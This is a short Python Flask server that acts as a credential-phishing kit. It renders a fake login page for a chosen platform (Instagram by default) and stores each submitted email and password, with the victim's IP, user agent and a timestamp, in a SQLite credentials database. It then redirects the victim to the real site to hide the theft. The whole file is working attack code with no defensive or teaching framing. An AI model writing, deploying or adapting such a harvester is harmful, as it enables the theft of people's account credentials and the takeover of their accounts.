from flask import Flask, request, render_template, redirect
from waitress import serve
import sqlite3
import os
import sys
from datetime import datetime

app = Flask(__name__, template_folder='app/templates', static_folder='app/static')
PLATFORM = sys.argv[1] if len(sys.argv) > 1 else "instagram"

DB_PATH = os.path.join(os.getcwd(), '../creds.db')

if not os.path.exists(DB_PATH):
    raise FileNotFoundError(f"[ERROR] Did not find data base at {DB_PATH}")


@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        ip = request.remote_addr
        user_agent = request.headers.get('User-Agent')
        timestamp = datetime.utcnow().isoformat()

        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('''INSERT INTO credentials (email, password, ip, user_agent, timestamp, status) VALUES (?, ?, ?, ?, ?, ?)''', (email, password, ip, user_agent, timestamp, 'Pending'))
        conn.commit()
        conn.close()

        return redirect(f"https://{PLATFORM}.com")
    
    return render_template(f"login_{PLATFORM}.html")

if __name__ == '__main__':
    serve(app, host='0.0.0.0', port=5000)
